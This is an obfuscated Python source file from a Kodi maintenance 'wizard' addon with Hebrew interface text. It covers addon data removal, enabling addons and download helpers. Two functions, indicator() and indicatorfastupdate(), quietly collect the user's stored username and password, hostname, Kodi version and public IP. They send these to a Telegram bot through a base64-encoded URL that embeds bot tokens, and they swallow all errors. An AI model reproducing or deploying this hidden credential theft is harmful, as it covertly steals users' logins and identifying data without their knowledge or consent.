		else :O0O0O0000OOOOO0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3733
		if O0O0O0000OOOOO0O0 ==1 :wiz .reloadFix ('remove addon')#line:3734
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3735
def removeAddonDataMenu ():#line:3737
	if os .path .exists (ADDOND ):#line:3738
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3739
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3740
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3741
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3742
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3743
		O0O00O0OOO0OOOO00 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3744
		for O0OO0OO00O0OOOO0O in sorted (O0O00O0OOO0OOOO00 ,key =lambda O0O0O00O0OOO00O00 :O0O0O00O0OOO00O00 ):#line:3745
			OO00OOOOOOO000OO0 =O0OO0OO00O0OOOO0O .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3746
			O000O00O0OOO00O0O =os .path .join (O0OO0OO00O0OOOO0O .replace (ADDOND ,ADDONS ),'icon.png')#line:3747
			O00O0OOO0OOOOO000 =os .path .join (O0OO0OO00O0OOOO0O .replace (ADDOND ,ADDONS ),'fanart.png')#line:3748
			OOOO0OOOOOOO00OOO =OO00OOOOOOO000OO0 #line:3749
			OOO00OO0OO00000O0 ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3750
			for OO00OO0OOO0O0OO0O in OOO00OO0OO00000O0 :#line:3751
				OOOO0OOOOOOO00OOO =OOOO0OOOOOOO00OOO .replace (OO00OO0OOO0O0OO0O ,OOO00OO0OO00000O0 [OO00OO0OOO0O0OO0O ])#line:3752
			if OO00OOOOOOO000OO0 in EXCLUDES :OOOO0OOOOOOO00OOO ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%OOOO0OOOOOOO00OOO #line:3753
			else :OOOO0OOOOOOO00OOO ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%OOOO0OOOOOOO00OOO #line:3754
			addFile (' %s'%OOOO0OOOOOOO00OOO ,'removedata',OO00OOOOOOO000OO0 ,icon =O000O00O0OOO00O0O ,fanart =O00O0OOO0OOOOO000 ,themeit =THEME2 )#line:3755
	else :#line:3756
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3757
	setView ('files','viewType')#line:3758
def enableAddons ():#line:3760
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3761
	OO0O000000O0O0OOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3762
	OO000OO000O00OOOO =0 #line:3763
	for OO0OO00OO00O000OO in sorted (OO0O000000O0O0OOO ,key =lambda OO00O0OOOOOOOO000 :OO00O0OOOOOOOO000 ):#line:3764
		O0O00OOOO00000OOO =os .path .split (OO0OO00OO00O000OO [:-1 ])[1 ]#line:3765
		if O0O00OOOO00000OOO in EXCLUDES :continue #line:3766
		if O0O00OOOO00000OOO in DEFAULTPLUGINS :continue #line:3767
		OOO0000OO00O0OOO0 =os .path .join (OO0OO00OO00O000OO ,'addon.xml')#line:3768
		if os .path .exists (OOO0000OO00O0OOO0 ):#line:3769
			OO000OO000O00OOOO +=1 #line:3770
			OO0O000000O0O0OOO =OO0OO00OO00O000OO .replace (ADDONS ,'')[1 :-1 ]#line:3771
			O0OOO00O0O00O00O0 =open (OOO0000OO00O0OOO0 )#line:3772
			OO0OOOO0OO00OOOOO =O0OOO00O0O00O00O0 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3773
			O0O00000O0O000000 =wiz .parseDOM (OO0OOOO0OO00OOOOO ,'addon',ret ='id')#line:3774
			O00O0O00O0O00OOO0 =wiz .parseDOM (OO0OOOO0OO00OOOOO ,'addon',ret ='name')#line:3775
			try :#line:3776
				OO00OOOO0OO0O0000 =O0O00000O0O000000 [0 ]#line:3777
				OO0O0OO0O00OO0OOO =O00O0O00O0O00OOO0 [0 ]#line:3778
			except :#line:3779
				continue #line:3780
			try :#line:3781
				OOO0O0O0O0OOO0O00 =xbmcaddon .Addon (id =OO00OOOO0OO0O0000 )#line:3782
				O00OO00OOOOOO0000 ="[COLOR green][Enabled][/COLOR]"#line:3783
				OOO0OOOOOOOO00OOO ="false"#line:3784
			except :#line:3785
				O00OO00OOOOOO0000 ="[COLOR red][Disabled][/COLOR]"#line:3786
				OOO0OOOOOOOO00OOO ="true"#line:3787
				pass #line:3788
			OOOOOOOO0O00OO0O0 =os .path .join (OO0OO00OO00O000OO ,'icon.png')if os .path .exists (os .path .join (OO0OO00OO00O000OO ,'icon.png'))else ICON #line:3789
			O0O000OO0OOOO0OO0 =os .path .join (OO0OO00OO00O000OO ,'fanart.jpg')if os .path .exists (os .path .join (OO0OO00OO00O000OO ,'fanart.jpg'))else FANART #line:3790
			addFile ("%s %s"%(O00OO00OOOOOO0000 ,OO0O0OO0O00OO0OOO ),'toggleaddon',OO0O000000O0O0OOO ,OOO0OOOOOOOO00OOO ,icon =OOOOOOOO0O00OO0O0 ,fanart =O0O000OO0OOOO0OO0 )#line:3791
			O0OOO00O0O00O00O0 .close ()#line:3792
	if OO000OO000O00OOOO ==0 :#line:3793
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3794
	setView ('files','viewType')#line:3795
def changeFeq ():#line:3797
	OOOOOOOOO000OO000 =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3798
	OO0O0OO00OO0OO000 =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,OOOOOOOOO000OO000 )#line:3799
	if not OO0O0OO00OO0OO000 ==-1 :#line:3800
		wiz .setS ('autocleanfeq',str (OO0O0OO00OO0OO000 ))#line:3801
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,OOOOOOOOO000OO000 [OO0O0OO00OO0OO000 ]))#line:3802
def developer ():#line:3804
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3805
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3806
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3807
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3808
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3809
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3810
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3811
	setView ('files','viewType')#line:3813
def download (O0000OO0O000O0OO0 ,O00O0OO000O0OOO00 ):#line:3818
  O00OO0O00O0O0OO00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3819
  O000O0O000OOOO000 =xbmcgui .DialogProgress ()#line:3820
  O000O0O000OOOO000 .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3821
  O0OOOOOO0OO0O0OOO =os .path .join (O00OO0O00O0O0OO00 ,'isr.zip')#line:3822
  OO0OOO000OOOO0OO0 =urllib2 .Request (O0000OO0O000O0OO0 )#line:3823
  OO00OOOOOOO000OOO =urllib2 .urlopen (OO0OOO000OOOO0OO0 )#line:3824
  O0O0OO0OOOO0OOOO0 =xbmcgui .DialogProgress ()#line:3826
  O0O0OO0OOOO0OOOO0 .create ("Downloading","Downloading "+name )#line:3827
  O0O0OO0OOOO0OOOO0 .update (0 )#line:3828
  O0O00OO0OOO00O000 =O00O0OO000O0OOO00 #line:3829
  O00O0O0O0O00OO000 =open (O0OOOOOO0OO0O0OOO ,'wb')#line:3830
  try :#line:3832
    O00000OO0OOO0OO0O =OO00OOOOOOO000OOO .info ().getheader ('Content-Length').strip ()#line:3833
    O00OOOO0O0OOO0000 =True #line:3834
  except AttributeError :#line:3835
        O00OOOO0O0OOO0000 =False #line:3836
  if O00OOOO0O0OOO0000 :#line:3838
        O00000OO0OOO0OO0O =int (O00000OO0OOO0OO0O )#line:3839
  O0OOO0OO0OOOOOOO0 =0 #line:3841
  O000O0OO00O00OOO0 =time .time ()#line:3842
  while True :#line:3843
        O0OO0OOO0OO00O0OO =OO00OOOOOOO000OOO .read (8192 )#line:3844
        if not O0OO0OOO0OO00O0OO :#line:3845
            sys .stdout .write ('\n')#line:3846
            break #line:3847
        O0OOO0OO0OOOOOOO0 +=len (O0OO0OOO0OO00O0OO )#line:3849
        O00O0O0O0O00OO000 .write (O0OO0OOO0OO00O0OO )#line:3850
        if not O00OOOO0O0OOO0000 :#line:3852
            O00000OO0OOO0OO0O =O0OOO0OO0OOOOOOO0 #line:3853
        if O0O0OO0OOOO0OOOO0 .iscanceled ():#line:3854
           O0O0OO0OOOO0OOOO0 .close ()#line:3855
           try :#line:3856
            os .remove (O0OOOOOO0OO0O0OOO )#line:3857
           except :#line:3858
            pass #line:3859
           break #line:3860
        OO0000OO00000OOO0 =float (O0OOO0OO0OOOOOOO0 )/O00000OO0OOO0OO0O #line:3861
        OO0000OO00000OOO0 =round (OO0000OO00000OOO0 *100 ,2 )#line:3862
        O0OOOOOO00OOO00O0 =O0OOO0OO0OOOOOOO0 /(1024 *1024 )#line:3863
        O0O0O000O0000O0OO =O00000OO0OOO0OO0O /(1024 *1024 )#line:3864
        OOO0OOO0O0O00OO0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OOOOOO00OOO00O0 ,'teal',O0O0O000O0000O0OO )#line:3865
        if (time .time ()-O000O0OO00O00OOO0 )>0 :#line:3866
          OOOOOO0OOOOOOOO00 =O0OOO0OO0OOOOOOO0 /(time .time ()-O000O0OO00O00OOO0 )#line:3867
          OOOOOO0OOOOOOOO00 =OOOOOO0OOOOOOOO00 /1024 #line:3868
        else :#line:3869
         OOOOOO0OOOOOOOO00 =0 #line:3870
        O00O00OOOO00OO00O ='KB'#line:3871
        if OOOOOO0OOOOOOOO00 >=1024 :#line:3872
           OOOOOO0OOOOOOOO00 =OOOOOO0OOOOOOOO00 /1024 #line:3873
           O00O00OOOO00OO00O ='MB'#line:3874
        if OOOOOO0OOOOOOOO00 >0 and not OO0000OO00000OOO0 ==100 :#line:3875
            OO0OOO0O000OOO0OO =(O00000OO0OOO0OO0O -O0OOO0OO0OOOOOOO0 )/OOOOOO0OOOOOOOO00 #line:3876
        else :#line:3877
            OO0OOO0O000OOO0OO =0 #line:3878
        OO00OOO0OO0O0O0O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOOOO0OOOOOOOO00 ,O00O00OOOO00OO00O )#line:3879
        O0O0OO0OOOO0OOOO0 .update (int (OO0000OO00000OOO0 ),"Downloading "+name ,OOO0OOO0O0O00OO0O ,OO00OOO0OO0O0O0O0 )#line:3881
  OOOOO0OO0O000000O =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3884
  O00O0O0O0O00OO000 .close ()#line:3886
  extract (O0OOOOOO0OO0O0OOO ,OOOOO0OO0O000000O ,O0O0OO0OOOO0OOOO0 )#line:3888
  if os .path .exists (OOOOO0OO0O000000O +'/scakemyer-script.quasar.burst'):#line:3889
    if os .path .exists (OOOOO0OO0O000000O +'/script.quasar.burst'):#line:3890
     shutil .rmtree (OOOOO0OO0O000000O +'/script.quasar.burst',ignore_errors =False )#line:3891
    os .rename (OOOOO0OO0O000000O +'/scakemyer-script.quasar.burst',OOOOO0OO0O000000O +'/script.quasar.burst')#line:3892
  if os .path .exists (OOOOO0OO0O000000O +'/plugin.video.kmediatorrent-master'):#line:3894
    if os .path .exists (OOOOO0OO0O000000O +'/plugin.video.kmediatorrent'):#line:3895
     shutil .rmtree (OOOOO0OO0O000000O +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3896
    os .rename (OOOOO0OO0O000000O +'/plugin.video.kmediatorrent-master',OOOOO0OO0O000000O +'/plugin.video.kmediatorrent')#line:3897
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3898
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3899
  try :#line:3900
    os .remove (O0OOOOOO0OO0O0OOO )#line:3901
  except :#line:3902
    pass #line:3903
  O0O0OO0OOOO0OOOO0 .close ()#line:3904
def dis_or_enable_addon (OOOO0OO00O00OO0OO ,OO000O0O00000O00O ,enable ="true"):#line:3905
    import json #line:3906
    O00O000O000OO0OOO ='"%s"'%OOOO0OO00O00OO0OO #line:3907
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OOOO0OO00O00OO0OO )and enable =="true":#line:3908
        logging .warning ('already Enabled')#line:3909
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OOOO0OO00O00OO0OO )#line:3910
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OOOO0OO00O00OO0OO )and enable =="false":#line:3911
        return xbmc .log ("### Skipped %s, reason = not installed"%OOOO0OO00O00OO0OO )#line:3912
    else :#line:3913
        OOO0O00O000O0O0O0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O00O000O000OO0OOO ,enable )#line:3914
        OOO0OO0000OOOO0O0 =xbmc .executeJSONRPC (OOO0O00O000O0O0O0 )#line:3915
        O0O00OOO0OOO0OOOO =json .loads (OOO0OO0000OOOO0O0 )#line:3916
        if enable =="true":#line:3917
            xbmc .log ("### Enabled %s, response = %s"%(OOOO0OO00O00OO0OO ,O0O00OOO0OOO0OOOO ))#line:3918
        else :#line:3919
            xbmc .log ("### Disabled %s, response = %s"%(OOOO0OO00O00OO0OO ,O0O00OOO0OOO0OOOO ))#line:3920
    if OO000O0O00000O00O =='auto':#line:3921
     return True #line:3922
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3923
def chunk_report (OOO0O0OOO00O0OOO0 ,OO000000O0O000OO0 ,OO00OOO0O000O0OOO ):#line:3924
   O0OOOOO00O0O00O00 =float (OOO0O0OOO00O0OOO0 )/OO00OOO0O000O0OOO #line:3925
   O0OOOOO00O0O00O00 =round (O0OOOOO00O0O00O00 *100 ,2 )#line:3926
   if OOO0O0OOO00O0OOO0 >=OO00OOO0O000O0OOO :#line:3928
      sys .stdout .write ('\n')#line:3929
def chunk_read (O0OO0OO00OO000OO0 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3931
   import time #line:3932
   O0O0OOO0OOOO00OO0 =int (filesize )*1000000 #line:3933
   OO00OOO0O0OO00O0O =0 #line:3935
   OOO0O0O00OOO00OOO =time .time ()#line:3936
   O0O0OO0OO00O00OOO =0 #line:3937
   logging .warning ('Downloading')#line:3939
   with open (destination ,"wb")as OO0OOOOOO000OOO0O :#line:3940
    while 1 :#line:3941
      OOOO0O00OOOOOOO00 =time .time ()-OOO0O0O00OOO00OOO #line:3942
      OOO0O00O00O0OO000 =int (O0O0OO0OO00O00OOO *chunk_size )#line:3943
      O0OOO000000000O00 =O0OO0OO00OO000OO0 .read (chunk_size )#line:3944
      OO0OOOOOO000OOO0O .write (O0OOO000000000O00 )#line:3945
      OO0OOOOOO000OOO0O .flush ()#line:3946
      OO00OOO0O0OO00O0O +=len (O0OOO000000000O00 )#line:3947
      OOO0OOO00O00OOOOO =float (OO00OOO0O0OO00O0O )/O0O0OOO0OOOO00OO0 #line:3948
      OOO0OOO00O00OOOOO =round (OOO0OOO00O00OOOOO *100 ,2 )#line:3949
      if int (OOOO0O00OOOOOOO00 )>0 :#line:3950
        O0000O0000OO000O0 =int (OOO0O00O00O0OO000 /(1024 *OOOO0O00OOOOOOO00 ))#line:3951
      else :#line:3952
         O0000O0000OO000O0 =0 #line:3953
      if O0000O0000OO000O0 >1024 and not OOO0OOO00O00OOOOO ==100 :#line:3954
          O00OO0O000OOO0000 =int (((O0O0OOO0OOOO00OO0 -OOO0O00O00O0OO000 )/1024 )/(O0000O0000OO000O0 ))#line:3955
      else :#line:3956
          O00OO0O000OOO0000 =0 #line:3957
      if O00OO0O000OOO0000 <0 :#line:3958
        O00OO0O000OOO0000 =0 #line:3959
      dp .update (int (OOO0OOO00O00OOOOO ),name +"[B]מוריד: [/B]","\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OOO0OOO00O00OOOOO ,OOO0O00O00O0OO000 /(1024 *1024 ),O0O0OOO0OOOO00OO0 /(1000 *1000 ),O0000O0000OO000O0 ),'[COLOR aqua]%02d:%02d[/COLOR][B]זמן שנותר: [/B]'%divmod (O00OO0O000OOO0000 ,60 ))#line:3960
      if dp .iscanceled ():#line:3961
         dp .close ()#line:3962
         break #line:3963
      if not O0OOO000000000O00 :#line:3964
         break #line:3965
      if report_hook :#line:3967
         report_hook (OO00OOO0O0OO00O0O ,chunk_size ,O0O0OOO0OOOO00OO0 )#line:3968
      O0O0OO0OO00O00OOO +=1 #line:3969
   logging .warning ('END Downloading')#line:3970
   return OO00OOO0O0OO00O0O #line:3971
def googledrive_download (OO0000O0O000O0O0O ,O0O00OOOOOOO0OO00 ,OO0OO0OOOO00OO000 ,OOO00OOO0OOOO0000 ):#line:3973
    OOOO0O0OOOO00O0OO =[]#line:3977
    OOOO000000OO0O00O =OO0000O0O000O0O0O .split ('=')#line:3978
    OO0000O0O000O0O0O =OOOO000000OO0O00O [len (OOOO000000OO0O00O )-1 ]#line:3979
    def OO00O000OOOO000O0 (OO0000OO0O0OO00OO ):#line:3981
        for OOOO0OO0O0OO00O0O in OO0000OO0O0OO00OO :#line:3983
            logging .warning ('cookie.name')#line:3984
            logging .warning (OOOO0OO0O0OO00O0O .name )#line:3985
            OOOOOOOOOOO000O0O =OOOO0OO0O0OO00O0O .value #line:3986
            if 'download_warning'in OOOO0OO0O0OO00O0O .name :#line:3987
                logging .warning (OOOO0OO0O0OO00O0O .value )#line:3988
                logging .warning ('cookie.value')#line:3989
                return OOOO0OO0O0OO00O0O .value #line:3990
            return OOOOOOOOOOO000O0O #line:3991
        return None #line:3993
    def OO0O0O0O0OOO000O0 (OO000OOO000OO0000 ,O0O0O0O0O0OOO0OOO ):#line:3995
        OOO00OOO00O0O0O00 =32768 #line:3997
        OO0OO00000000000O =time .time ()#line:3998
        with open (O0O0O0O0O0OOO0OOO ,"wb")as O0OO0O0O000OOOOOO :#line:4000
            O0O00O000O0O00000 =1 #line:4001
            OOO000O00O0O0000O =32768 #line:4002
            try :#line:4003
                O0O0OOOO0OO00OO00 =int (OO000OOO000OO0000 .headers .get ('content-length'))#line:4004
                print ('file total size :',O0O0OOOO0OO00OO00 )#line:4005
            except TypeError :#line:4006
                print ('using dummy length !!!')#line:4007
                O0O0OOOO0OO00OO00 =int (OOO00OOO0OOOO0000 )*1000000 #line:4008
            for O00OO0OOOOOO00OOO in OO000OOO000OO0000 .iter_content (OOO00OOO00O0O0O00 ):#line:4009
                if O00OO0OOOOOO00OOO :#line:4010
                    O0OO0O0O000OOOOOO .write (O00OO0OOOOOO00OOO )#line:4011
                    O0OO0O0O000OOOOOO .flush ()#line:4012
                    O0OO0000O000O0O0O =time .time ()-OO0OO00000000000O #line:4013
                    OO0OO0OO00OOO0O00 =int (O0O00O000O0O00000 *OOO000O00O0O0000O )#line:4014
                    if O0OO0000O000O0O0O ==0 :#line:4015
                        O0OO0000O000O0O0O =0.1 #line:4016
                    O000O00OOO0OO00OO =int (OO0OO0OO00OOO0O00 /(1024 *O0OO0000O000O0O0O ))#line:4017
                    OOOOOOOOOO000O0OO =int (O0O00O000O0O00000 *OOO000O00O0O0000O *100 /O0O0OOOO0OO00OO00 )#line:4018
                    if O000O00OOO0OO00OO >1024 and not OOOOOOOOOO000O0OO ==100 :#line:4019
                      OO000OOOO0OOO00OO =int (((O0O0OOOO0OO00OO00 -OO0OO0OO00OOO0O00 )/1024 )/(O000O00OOO0OO00OO ))#line:4020
                    else :#line:4021
                      OO000OOOO0OOO00OO =0 #line:4022
                    OO0OO0OOOO00OO000 .update (int (OOOOOOOOOO000O0OO ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OOOOOOOOOO000O0OO ,OO0OO0OO00OOO0O00 /(1024 *1024 ),O0O0OOOO0OO00OO00 /(1000 *1000 ),O000O00OOO0OO00OO ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OO000OOOO0OOO00OO ,60 ))#line:4024
                    O0O00O000O0O00000 +=1 #line:4025
                    if OO0OO0OOOO00OO000 .iscanceled ():#line:4026
                     OO0OO0OOOO00OO000 .close ()#line:4027
                     break #line:4028
    OO00O0O0O000O0O00 ="https://docs.google.com/uc?export=download"#line:4029
    import urllib2 #line:4034
    import cookielib #line:4035
    from cookielib import CookieJar #line:4037
    OO0OOO0O0OO0OOOOO =CookieJar ()#line:4039
    OO0000O000OO00OOO =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (OO0OOO0O0OO0OOOOO ))#line:4040
    O0O0OO0OOO0O0OO0O ={'id':OO0000O0O000O0O0O }#line:4042
    O0OO000OO000O00O0 =urllib .urlencode (O0O0OO0OOO0O0OO0O )#line:4043
    logging .warning (OO00O0O0O000O0O00 +'&'+O0OO000OO000O00O0 )#line:4044
    OO0OO0O000OOO0O0O =OO0000O000OO00OOO .open (OO00O0O0O000O0O00 +'&'+O0OO000OO000O00O0 )#line:4045
    O0O0O0O0OO00OOO0O =OO0OO0O000OOO0O0O .read ()#line:4046
    for OO0O000OOOO0OO0OO in OO0OOO0O0OO0OOOOO :#line:4048
         logging .warning (OO0O000OOOO0OO0OO )#line:4049
    O0OOO000O0O0OOO00 =OO00O000OOOO000O0 (OO0OOO0O0OO0OOOOO )#line:4050
    logging .warning (O0OOO000O0O0OOO00 )#line:4051
    if O0OOO000O0O0OOO00 :#line:4052
        OO00OOOOO0O00O00O ={'id':OO0000O0O000O0O0O ,'confirm':O0OOO000O0O0OOO00 }#line:4053
        O00O0O0O00O00OOO0 ={'Access-Control-Allow-Headers':'Content-Length'}#line:4054
        O0OO000OO000O00O0 =urllib .urlencode (OO00OOOOO0O00O00O )#line:4055
        OO0OO0O000OOO0O0O =OO0000O000OO00OOO .open (OO00O0O0O000O0O00 +'&'+O0OO000OO000O00O0 )#line:4056
        chunk_read (OO0OO0O000OOO0O0O ,report_hook =chunk_report ,dp =OO0OO0OOOO00OO000 ,destination =O0O00OOOOOOO0OO00 ,filesize =OOO00OOO0OOOO0000 )#line:4057
    return (OOOO0O0OOOO00O0OO )#line:4061
def kodi17Fix ():#line:4062
	O0OO00OOO0OO0O00O =glob .glob (os .path .join (ADDONS ,'*/'))#line:4063
	O00O000O000000000 =[]#line:4064
	for OO000O0O00O0OO0OO in sorted (O0OO00OOO0OO0O00O ,key =lambda OO0O0O00O0OOOO0OO :OO0O0O00O0OOOO0OO ):#line:4065
		O0OO0O0OO000O000O =os .path .join (OO000O0O00O0OO0OO ,'addon.xml')#line:4066
		if os .path .exists (O0OO0O0OO000O000O ):#line:4067
			OO00OO00O00OOOOOO =OO000O0O00O0OO0OO .replace (ADDONS ,'')[1 :-1 ]#line:4068
			OO0OO0O0OOO0O0O0O =open (O0OO0O0OO000O000O )#line:4069
			OO0O0O00OOO000000 =OO0OO0O0OOO0O0O0O .read ()#line:4070
			OO0O0OOO0O0O00O00 =parseDOM (OO0O0O00OOO000000 ,'addon',ret ='id')#line:4071
			OO0OO0O0OOO0O0O0O .close ()#line:4072
			try :#line:4073
				OOO0O00000O0O00OO =xbmcaddon .Addon (id =OO0O0OOO0O0O00O00 [0 ])#line:4074
			except :#line:4075
				try :#line:4076
					log ("%s was disabled"%OO0O0OOO0O0O00O00 [0 ],xbmc .LOGDEBUG )#line:4077
					O00O000O000000000 .append (OO0O0OOO0O0O00O00 [0 ])#line:4078
				except :#line:4079
					try :#line:4080
						log ("%s was disabled"%OO00OO00O00OOOOOO ,xbmc .LOGDEBUG )#line:4081
						O00O000O000000000 .append (OO00OO00O00OOOOOO )#line:4082
					except :#line:4083
						if len (OO0O0OOO0O0O00O00 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%OO00OO00O00OOOOOO ,xbmc .LOGERROR )#line:4084
						else :log ("Unabled to enable: %s"%OO000O0O00O0OO0OO ,xbmc .LOGERROR )#line:4085
	if len (O00O000O000000000 )>0 :#line:4086
		O0OOOO00O000OOO00 =0 #line:4087
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:4088
		for O00OOOOO00OOO0OO0 in O00O000O000000000 :#line:4089
			O0OOOO00O000OOO00 +=1 #line:4090
			O000O0OO0OO0000OO =int (percentage (O0OOOO00O000OOO00 ,len (O00O000O000000000 )))#line:4091
			DP .update (O000O0OO0OO0000OO ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OOOOO00OOO0OO0 ))#line:4092
			addonDatabase (O00OOOOO00OOO0OO0 ,1 )#line:4093
			if DP .iscanceled ():break #line:4094
		if DP .iscanceled ():#line:4095
			DP .close ()#line:4096
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:4097
			sys .exit ()#line:4098
		DP .close ()#line:4099
	forceUpdate ()#line:4100
def indicator ():#line:4102
       try :#line:4103
          import json #line:4104
          wiz .log ('FRESH MESSAGE')#line:4105
          OO000OOO0OO0000OO =(ADDON .getSetting ("user"))#line:4106
          O0OOOOOO000O0OOOO =(ADDON .getSetting ("pass"))#line:4107
          OOOO00O0O00O00000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:4108
          O000OOOOO0O00000O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:4109
          O0O00O0O00O0O0000 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:4110
          OO000O00OO0OOOOOO =str (json .loads (O0O00O0O00O0O0000 )['ip'])#line:4111
          OOO000OOO0000O0O0 =OO000OOO0OO0000OO #line:4112
          OOO0O0O000OOO0O0O =O0OOOOOO000O0OOOO #line:4113
          import socket #line:4114
          O0O00O0O00O0O0000 =urllib2 .urlopen (O000OOOOO0O00000O .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OOO000OOO0000O0O0 +' - '+OOO0O0O000OOO0O0O +' - '+OOOO00O0O00O00000 +' - '+OO000O00OO0OOOOOO ).readlines ()#line:4115
       except :pass #line:4117
def indicatorfastupdate ():#line:4119
       try :#line:4120
          import json #line:4121
          wiz .log ('FRESH MESSAGE')#line:4122
          O0O0OO00OOOOO0O00 =(ADDON .getSetting ("user"))#line:4123
          O0O000000OO00000O =(ADDON .getSetting ("pass"))#line:4124
          O0O0O0O00O0O00OOO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:4125
          O0O0O0000OO00000O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:4127
          OO0O00O0000O0O000 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:4128
          OO000OOOO0OO0O0O0 =str (json .loads (OO0O00O0000O0O000 )['ip'])#line:4129
          OOOOO00OOO00O00OO =O0O0OO00OOOOO0O00 #line:4130
          OOO0OO00000OO00OO =O0O000000OO00000O #line:4131
          import socket #line:4133
          OO0O00O0000O0O000 =urllib2 .urlopen (O0O0O0000OO00000O .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OOOOO00OOO00O00OO +' - '+OOO0OO00000OO00OO +' - '+O0O0O0O00O0O00OOO +' - '+OO000OOOO0OO0O0O0 ).readlines ()#line:4134
       except :pass #line:4136
def skinfix18 ():#line:4138
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:4139
		OO0O000O00OO0OO0O =wiz .workingURL (SKINID18DDONXML )#line:4140
